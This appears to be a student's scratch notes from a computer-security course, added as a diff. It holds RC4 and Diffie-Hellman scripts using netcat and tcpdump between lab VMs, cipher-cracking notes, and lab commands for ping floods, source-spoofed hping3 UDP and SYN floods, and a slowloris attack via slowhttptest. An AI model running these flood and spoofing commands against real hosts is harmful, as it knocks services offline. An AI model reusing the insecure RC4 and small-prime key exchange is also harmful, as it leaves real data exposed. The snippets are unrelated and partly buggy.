@@ -1,0 +1,729 @@
+
+min⁡( p[i-1]+m(i-1,i)  + MinCost(i+1,i+2),           p[j-1]+p[i-1]  +m(i-1,j-1)  - v(i-1,j-1)  + MinCost(j,j+1) )
+
+->8 t $ [1-9][1-9][1-9][1-9][1-9][1-9]
+->8 t $ [1-9][1-9][1-9][1-9][1-9]
+->8 t $ [1-9][1-9][1-9][1-9]
+
+( (t > [2-8] ) $ [1-9]{1,6} ) > [7-13]
+
+t( >[6-8]  $ [1-9] )
+
+import itertools
+
+alph = "Choppakatla"
+permutations = itertools.product(*[(c.upper(), c.lower()) for c in aplh])
+
+with open("/home/Faisal/permutations.txt", "w") as f:
+    for p in permutations:
+        f.write("".join(p) + "\n")
+
+
+
+abcdefgh
+c - 77 times e
+w-55 times t
+z-47 times a
+p-42 times o
+l-38 times s
+i-34 times i
+
+c -> e
+@ ->  
+_ -> .
+z -> a
+p -> o
+h -> r	//check
+b -> d
+w -> t
+g -> h
+s -> n
+j -> c
+o -> m
+t -> l
+p -> t
+y -> f
+l -> s
+
+a -> w
+x -> p
+f -> g
+e -> b
+k -> v
+d -> y
+
+n -> q
+
+V -> A
+J -> M
+U -> T
+F -> W
+
+
+abcdefgh
+c - 77 times e
+w-55 times t
+z-47 times a
+p-42 times o
+l-38 times s
+i-34 times i
+
+
+
+
+V -> A
+
+-------------------	-------------	RC4	-----------------------
+
+def KSA(key):
+    #Key Scheduling Algorithm (KSA) for RC4.
+    keylength = len(key)
+
+    # Initialize permutation array
+    S = list(range(256))
+
+    # Use key to permute the array
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % keylength]) % 256
+        S[i], S[j] = S[j], S[i]  # Swap values
+
+    return S
+
+
+def PRGA(S, length):
+    #Pseudo-Random Generation Algorithm (PRGA) for RC4.
+    i = j = 0
+    keystream = []
+    for _ in range(length):
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]  # Swap values
+        k = S[(S[i] + S[j]) % 256]
+        keystream.append(k)
+
+    return keystream
+
+
+def encrypt(key, data):
+    #RC4 encryption  algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return str(output)
+
+def decrypt(key, data):
+    #RC4 decryption algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return bytes(output)
+
+
+key = b"Principles of Computer Security"
+--------------------	------------- end	 ------------------------------
+
+-------------------------	--------------	rc4s	-----------------------
+import argparse
+import subprocess
+import signal
+import rc4
+'''import time
+import subprocess
+
+# Create the named pipe
+subprocess.call('mkfifo vm1pipe', shell=True)
+
+# Open the pipe for writing
+pipe = open('vm1pipe', 'w')
+
+# Start the nc command to listen on port 12345 and write to the pipe
+#nc_proc
+NC = subprocess.Popen(['nc', '130.85.220.34', '12345'], stdout=pipe, stderr=subprocess.STDOUT)
+
+# Wait for 1 second to make sure nc is fully established
+time.sleep(1)
+
+# Open the pipe for reading and pass it to rc4s
+with open('vm1pipe', 'r') as input_pipe:
+    subprocess.call(['python3', 'rc4s.py'], stdin=input_pipe)
+
+# Close the pipe and terminate the nc process
+pipe.close()
+NC.terminate()
+
+parser = argparse.ArgumentParser(description='Encrypt and send message using RC4')
+parser.add_argument('-k', '--key', type=str, required=True, help='key for RC4 encryption')
+parser.add_argument('-m', '--message', type=str, required=True, help='message to be encrypted')
+#parser.add_argument('ip', type=str, help='IP address of receiver')
+#parser.add_argument('port', type=int, help='port of receiver')
+args = parser.parse_args()
+rc4.key=args.key
+en_messageargs.message
+'''
+# the netcat command to run and redirect its input/output to pipes
+#pipelining the 2 VM inorder to encrypt and decrypt  using shared key
+os_cmd = ['nc', '130.85.220.34', '12345']
+
+#NetCat
+NC = subprocess.Popen(os_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+
+print("Shared Key : " + rc4.key.decode("utf-8"))
+
+
+# tcpdump capture / wireshark capture, can use either .cap or .pcap
+tcpdump_cmd = ['tcpdump', '-n', '-i', 'ens160', '-w','tcpdumpcapture.cap', 'host', '130.85.121.106', 'and', 'port', '12345']
+
+# to store the packets of wireshark capture in .txt file
+with open('tcpdump1.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd, stdout=outfile, stderr=subprocess.STDOUT)
+
+en_message=bytes('Hello, it is a nice sunny day and we should enjoy the weather','utf-8')
+#Encrypt the plain text to send to the receiver
+encrypted_message = rc4.encrypt(rc4.key,en_message)
+'''with open("vm2pipe", "w") as pipe:
+        pipe.write(encrypted_message.encode().decode())
+'''
+NC.stdin.write(encrypted_message.encode() + b'\n')
+NC.stdin.flush()
+#tcpdump_proc.send_signal(signal.SIGINT)
+# receive the encrypted message from the receiver using netcat
+#received_message = subprocess.check_output(nc_cmd)
+'''with open("vm2pipe", "r") as pipe:
+        cipher = pipe.read().strip()
+'''
+cipher = NC.stdout.readline().decode().strip()
+cipher=cipher[1:-1].split(", ")
+cipher=[eval(i) for i in cipher]
+cipher=bytes(cipher)
+
+decrypted_message = rc4.decrypt(rc4.key,cipher)
+#print the decrypted message
+print(decrypted_message.decode("utf-8"))
+
+tcpdump_proc.send_signal(signal.SIGINT)
+------------	-----end	-------------------------------------------
+----------------------------------	diffehellman	---------------------------
+import subprocess
+import random
+import signal
+import rc4
+# the prime and primitive root.
+p = 1065601
+# took the value by finding the value from the function defined below
+g = 7
+def is_primitive_root(g, p):
+    """
+    Check if g is a primitive root of prime p
+    """
+    s = set(pow(g, i, p) for i in range(1, p))
+    return len(s) == p-1
+
+def find_primitive_root(p):
+    """
+    Find a primitive root of prime p
+    """
+    for g in range(2, p):
+        if is_primitive_root(g, p):
+            return g
+    return None
+#gg = find_primitive_root(p)
+#print(gg)
+
+# Generate a random private key
+private_key = random.randint(1000, p-2)
+print("Private Key YA :",private_key)
+# the netcat command to run and redirect its input/output to pipes
+os_cmd = ['nc', '130.85.220.34', '12345']
+NC = subprocess.Popen(os_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+
+interface = 'ens160'
+ip_address = '130.85.220.34'
+output_file = 'sender.pcap'
+tcpdump_cmd1 = f'tcpdump -i {interface} src {ip_address} -w {output_file}'
+#tcpdump_cmd2= f'tcpdump -i ens160 -s 0 -w capture.pcap &'
+tcpdump_cmd2= ['tcpdump', '-i', 'ens160', '-s', '0', '-w' ,'capture.pcap', '&','host', '130.85.220.34']
+#subprocess.run(tcpdump_cmd2, shell=True)
+
+with open('tcpdump3.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd2, stdout=outfile, stderr=subprocess.STDOUT)
+tcpdump_cmd = ['tcpdump', '-n', '-i', 'ens160', '-w','vm1capture.pcap', 'host', '130.85.121.106', 'and', 'port', '12345']
+
+# to store the tcpdump in file
+with open('tcpdump2.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd, stdout=outfile, stderr=subprocess.STDOUT)
+
+#Calculate YA = g^private_key mod p
+YA = pow(g, private_key, p)
+
+# Send YA to receiver
+NC.stdin.write(str(YA).encode("utf-8") + b'\n')
+NC.stdin.flush()
+# Receive YA from sender
+YB = int(NC.stdout.readline().decode("utf-8").strip())
+# Calculate the shared secret key K =  YA^private_key mod p
+K = pow(YB, private_key, p)
+
+print('Shared Secret Key:', K)
+
+
+def KSA(key):
+    #Key Scheduling Algorithm (KSA) for RC4.
+    keylength = len(key)
+
+    # Initialize permutation array
+    S = list(range(256))
+
+    # Use key to permute the array
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % keylength]) % 256
+        S[i], S[j] = S[j], S[i]
+
+    return S
+
+
+def PRGA(S, length):
+    #Pseudo-Random Generation Algorithm (PRGA) for RC4.
+    i = j = 0
+    keystream = []
+    for _ in range(length):
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        k = S[(S[i] + S[j]) % 256]
+        keystream.append(k)
+
+    return keystream
+
+
+def RC4_encryption(key, data):
+    #RC4 encryption  algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return str(output)
+
+def RC4_decryption(key, data):
+    #RC4 decryption algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return bytes(output)
+
+key = bytes(str(K), 'utf-8')
+
+#send message to VM2
+send=input("Send message : ")
+plaintext = bytes(send, 'utf-8')
+ciphertext_encrypt = rc4.encrypt(key, plaintext)
+#ciphertext_encrypt = RC4_encryption(key, plaintext)
+NC.stdin.write(ciphertext_encrypt.encode("utf-8") + b'\n')
+NC.stdin.flush()
+
+
+# received message from VM2
+cipher_decrypt = NC.stdout.readline().decode("utf-8").strip()
+cipher_decrypt=cipher_decrypt[1:-1].split(", ")
+#response=response[:-1]
+#tmp=response.split(", ")
+cipher_decrypt = [eval(i) for i in cipher_decrypt]
+cipher_decrypt = bytes(cipher_decrypt)
+#,"utf-8")
+plain_decrypt = rc4.decrypt(key, cipher_decrypt)
+#decrypted = RC4_decryption(key, response)
+print("Received message :", plain_decrypt.decode("utf-8"))
+tcpdump_proc.send_signal(signal.SIGINT)
+------------------------	end----------------------------------------------
+
+nc -l 12345
+nc 130.85.220.34 12345
+python3 rc4s.py -k 'Principles of Computer Security' -m 'Hello, it is a nice sunny day and we should enjoy the weather'
+python3 rc4s.py <vm1pipe | nc 130.85.220.34 12345 >vm1pipe
+nc -l 12345 <vm2pipe | python rc4r.py >vm2pipe
+mkfifo vm1pipe
+python3 rc4s.py
+python3 diffehellman.py
+cat tcpdumpcapture.cap
+nano rc4s.py
+ls
+wireshark -r capture.pcap 
+tshark -r capture.pcap
+ifconfig -a  // which interface to use and used ens160
+tcpdump -D // interface to capture used ens160
+tcpdump -n -i ens160 -w tcpdumpcapture.cap host 130.85.121.106 and port 12345
+tcpdump -n -i ens160 -w tcpdumpcapture.cap host 130.85.220.34 and port 12345
+
+------------
+import subprocess
+import random
+import signal
+import rc4
+# the prime and primitive root.
+p = 1065601
+# took the value by finding the value from the function defined below
+g = 7
+def is_primitive_root(g, p):
+    """
+    Check if g is a primitive root of prime p
+    """
+    s = set(pow(g, i, p) for i in range(1, p))
+    return len(s) == p-1
+
+def find_primitive_root(p):
+    """
+    Find a primitive root of prime p
+    """
+    for g in range(2, p):
+        if is_primitive_root(g, p):
+            return g
+    return None
+#gg = find_primitive_root(p)
+#print(gg)
+
+# Generate a random private key
+private_key = random.randint(1000, p-2)
+print("Private Key YA :",private_key)
+# the netcat command to run and redirect its input/output to pipes
+os_cmd = ['nc', '130.85.220.34', '12345']
+NC = subprocess.Popen(os_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+
+interface = 'ens160'
+ip_address = '130.85.220.34'
+output_file = 'sender.pcap'
+tcpdump_cmd1 = f'tcpdump -i {interface} src {ip_address} -w {output_file}'
+#tcpdump_cmd2= f'tcpdump -i ens160 -s 0 -w capture.pcap &'
+tcpdump_cmd2= ['tcpdump', '-i', 'ens160', '-s', '0', '-w' ,'capture.pcap', '&','host', '130.85.220.34']
+#subprocess.run(tcpdump_cmd2, shell=True)
+
+with open('tcpdump3.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd2, stdout=outfile, stderr=subprocess.STDOUT)
+tcpdump_cmd = ['tcpdump', '-n', '-i', 'ens160', '-w','vm1capture.pcap', 'host', '130.85.121.106', 'and', 'port', '12345']
+
+# to store the tcpdump in file
+with open('tcpdump2.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd, stdout=outfile, stderr=subprocess.STDOUT)
+
+#Calculate YA = g^private_key mod p
+YA = pow(g, private_key, p)
+
+# Send YA to receiver
+NC.stdin.write(str(YA).encode("utf-8") + b'\n')
+NC.stdin.flush()
+# Receive YA from sender
+YB = int(NC.stdout.readline().decode("utf-8").strip())
+# Calculate the shared secret key K =  YA^private_key mod p
+K = pow(YB, private_key, p)
+
+print('Shared Secret Key:', K)
+
+
+def KSA(key):
+    #Key Scheduling Algorithm (KSA) for RC4.
+    keylength = len(key)
+
+    # Initialize permutation array
+    S = list(range(256))
+
+    # Use key to permute the array
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % keylength]) % 256
+        S[i], S[j] = S[j], S[i]
+
+    return S
+
+
+def PRGA(S, length):
+    #Pseudo-Random Generation Algorithm (PRGA) for RC4.
+    i = j = 0
+    keystream = []
+    for _ in range(length):
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        k = S[(S[i] + S[j]) % 256]
+        keystream.append(k)
+
+    return keystream
+
+
+def RC4_encryption(key, data):
+    #RC4 encryption  algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return str(output)
+
+def RC4_decryption(key, data):
+    #RC4 decryption algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return bytes(output)
+
+key = bytes(str(K), 'utf-8')
+
+#send message to VM2
+#send=input("Send message : ")
+send="Hello, it is a nice sunny day and we should enjoy the weather"
+plaintext = bytes(send, 'utf-8')
+ciphertext_encrypt = rc4.encrypt(key, plaintext)
+#ciphertext_encrypt = RC4_encryption(key, plaintext)
+NC.stdin.write(ciphertext_encrypt.encode("utf-8") + b'\n')
+NC.stdin.flush()
+
+
+# received message from VM2
+cipher_decrypt = NC.stdout.readline().decode("utf-8").strip()
+cipher_decrypt=cipher_decrypt[1:-1].split(", ")
+cipher_decrypt = [eval(i) for i in cipher_decrypt]
+cipher_decrypt = bytes(cipher_decrypt)
+#,"utf-8")
+plain_decrypt = rc4.decrypt(key, cipher_decrypt)
+#decrypted = RC4_decryption(key, response)
+print("Received message :", plain_decrypt.decode("utf-8"))
+tcpdump_proc.send_signal(signal.SIGINT)
+----------------
+import subprocess
+import random
+import signal
+import rc4
+# the prime and primitive root.
+p = 1065601
+g = 7
+
+# Generate a random private key
+private_key = random.randint(1000, p-2)
+print("private key YB:",private_key)
+
+# the netcat command to run and redirect its input/output to pipes
+os_cmd = ['nc', '-l', '12345']
+NC = subprocess.Popen(os_cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+
+
+tcpdump_cmd1 = ['tcpdump',  '-i', 'ens160', '-s','0','w','capture.pcap','&', 'host', '130.85.220.34', 'and', '130.85.121.106']
+
+tcpdump_cmd = ['tcpdump', '-n', '-i', 'ens160', '-w','vm1capture.pcap', 'host', '130.85.220.34', 'and', 'port', '12345']
+
+# to store the tcpdump in file
+with open('tcpdump3.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd1, stdout=outfile, stderr=subprocess.STDOUT)
+# to store the tcpdump in file
+with open('tcpdump2.txt', 'w') as outfile:
+    tcpdump_proc = subprocess.Popen(tcpdump_cmd, stdout=outfile, stderr=subprocess.STDOUT)
+
+# Receive YA from computer A
+YA = int(NC.stdout.readline().decode("utf-8").strip())
+
+# Calculate YB = g^private_key mod p
+YB = pow(g, private_key, p)
+
+# Send YB to computer A
+NC.stdin.write(str(YB).encode("utf-8") + b'\n')
+NC.stdin.flush()
+
+# Calculate the shared secret key K =  YA^private_key mod p
+K = pow(YA, private_key, p)
+
+print('Shared Secret Key:', K)
+
+
+def KSA(key):
+    #Key Scheduling Algorithm (KSA) for RC4.
+    keylength = len(key)
+
+    # Initialize permutation array
+    S = list(range(256))
+
+    # Use key to permute the array
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % keylength]) % 256
+        S[i], S[j] = S[j], S[i]
+
+    return S
+
+
+def PRGA(S, length):
+    #Pseudo-Random Generation Algorithm (PRGA) for RC4.
+    i = j = 0
+    keystream = []
+    for _ in range(length):
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]  
+        k = S[(S[i] + S[j]) % 256]
+        keystream.append(k)
+
+    return keystream
+
+
+def RC4_encryption(key, data):
+    #RC4 encryption  algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return str(output)
+
+def RC4_decryption(key, data):
+    #RC4 decryption algorithm.
+    S = KSA(key)
+    keystream = PRGA(S, len(data))
+    output = [data[i] ^ keystream[i] for i in range(len(data))]
+    return bytes(output)
+
+key = bytes(str(K), 'utf-8')
+
+'''
+# received message
+response = NC.stdout.readline().decode("utf-8").strip()
+#print (response)
+response=response[1:]
+#print (response)
+response=response[:-1]
+#print (response)
+tmp=response.split(", ")
+tmp=res = [eval(i) for i in tmp]
+response = bytes(tmp)
+#,"utf-8")
+decrypted = RC4de(key, response)
+print("Received message: ", decrypted.decode("utf-8"))
+'''
+#received message from VM2
+cipher_decrypt = NC.stdout.readline().decode("utf-8").strip()
+cipher_decrypt=cipher_decrypt[1:-1].split(", ")
+#response=response[:-1]
+#tmp=response.split(", ")
+cipher_decrypt = [eval(i) for i in cipher_decrypt]
+cipher_decrypt = bytes(cipher_decrypt)
+#,"utf-8")
+plain_decrypt = rc4.decrypt(key, cipher_decrypt)
+#decrypted = RC4_decryption(key, response)
+print("Received message :", plain_decrypt.decode("utf-8"))
+
+#send message to VM2
+send=input("Send message : ")
+plaintext = bytes(send, 'utf-8')
+ciphertext_encrypt = rc4.encrypt(key, plaintext)
+#ciphertext_encrypt = RC4_encryption(key, plaintext)
+NC.stdin.write(ciphertext_encrypt.encode("utf-8") + b'\n')
+NC.stdin.flush()
+'''
+#send message
+send=input("Send message: : ")
+plaintext = bytes(send, 'utf-8')
+ciphertext = RC4en(key, plaintext)
+NC.stdin.write(ciphertext.encode("utf-8") + b'\n')
+NC.stdin.flush()
+'''
+
+tcpdump_proc.send_signal(signal.SIGINT)
+
+
+
+
+
+-----------------------------
+
+
+133.228.98.2/18
+a.
+icmp
+1.
+2.
+3. time =16043 ms   /// discarded----- 12670ms   /   13081 ms  / 12537ms
+downlaod file challenge, sudo previleges, nmap
+time sudo ping -f -c 100000 133.228.98.3
+sudo tcpdump -n -i ens192 -s0 -w icmpflood.pcap host 133.228.98.1 and icmp
+
+scp crsuser@133.228.98.1:/home/crsuser/excercise-a.txt .
+scp Faisal@130.85.121.106:/home/Faisal/excercise-a.txt C:\Users\juver\OneDrive\Desktop\gnments
+
+b.
+sudo prveliges 
+sudo ls
+sudo tcpdump -n -i ens192 -s0 -w icmpflood_b.pcap host 133.228.98.1 or 133.228.84.1 or 133.228.84.2 or 133.228.84.3 or 133.228.85.1 or 133.228.85.2 or 133.228.85.3 or 133.228.86.1 or 133.228.86.2 or 133.228.86.3 or 133.228.87.1  and icmp
+
+c.
+
+	a.sudo tcpdump -n -i ens192 -s0 -w udpattack.pcap 'host 133.228.98.1 and (icmp or (udp and dst port <attack port>))'
+sudo tcpdump -n -i <interface> -s0 -w udpflood.pcap host <IP of target machine> and (udp port <port>)
+sudo hping3 -2 -q -c <N> -a <IP of target machine> -p <destination port> <target IP address> &
+
+sudo tcpdump -n -i ens192 -s0 -w icmpflood_c.pcap 'host 133.228.98.1 or 133.228.84.1 or 133.228.84.2 or 133.228.84.3 or 133.228.85.1 or 133.228.85.2 or 133.228.85.3 or 133.228.86.1 or 133.228.86.2 or 133.228.86.3 or 133.228.87.1  and (icmp or (udp and dst port 80))'
+
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.84.1 &
+sudo tcpdump -nn -r icmpflood_c.pcap '(udp and dst port 80)' or icmp | wc -l
+
+screenshot14 o/p
+
+d.
+sudo tcpdump -nn -r tcp.pcap tcp | wc -l 
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.84.1 &
+sudo tcpdump -n -i ens192 -w tcpsyn.pcap tcp
+
+screenshot15 o/p tcp sent back
+
+tcpdump -r tcpsyn.pcap 'tcp[tcpflags] & tcp-rst !=0' | wc -l		// reset packets 50
+tcpdump -r tcpsyn.pcap 'tcp[tcpflags] & tcp-syn !=0' | wc -l		// syn packets 15 total 65
+syn,reset challenge
+e. 
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 25 -t GET -u http://133.228.98.3/index.php
+-x 24 -p 3
+
+screenshot16 o/p
+
+-c 1000: This specifies the number of connections to be opened by the attacker to the target web server.
+-H: This specifies that the slowloris attack should be launched in HTTP mode.
+-g: This enables slowloris to send GET requests to the target web server.
+-o slowloris.stats: This specifies the name of the file where the output of the attack will be stored.
+-i 10: This specifies the time in seconds for which the slowloris will hold each connection open.
+-r 25: This specifies the number of requests to be generated per second.
+-t GET: This specifies the type of HTTP request to be generated by slowloris.
+-u http://<target_ip_address>/index.html: This specifies the URL of the target web server.
+-x 24: This specifies the number of bytes to be sent as a payload in each HTTP request.
+-p 3: This specifies the number of parameters to be sent in each HTTP request.
+
+
+
+
+
+
+#!/bin/bash
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.84.1 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.84.2 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.84.3 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.85.1 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.85.2 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.85.3 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.86.1 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.86.2 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.86.3 &
+sudo hping3 -1 -q -c 5 -a 133.228.98.3 133.228.87.1 &
+
+
+#!/bin/bash
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.84.1 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.84.2 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.84.3 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.85.1 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.85.2 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.85.3 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.86.1 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.86.2 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.86.3 &
+sudo hping3 -2 -q -c 5 -a 133.228.98.3 -p 80 133.228.87.1 &
+
+#!/bin/bash
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.84.1 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.84.2 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.84.3 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.85.1 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.85.2 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.85.3 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.86.1 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.86.2 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.86.3 &
+sudo hping3 -S -q -c 5 -a 133.228.98.3 -p 80 133.228.87.1 &
+
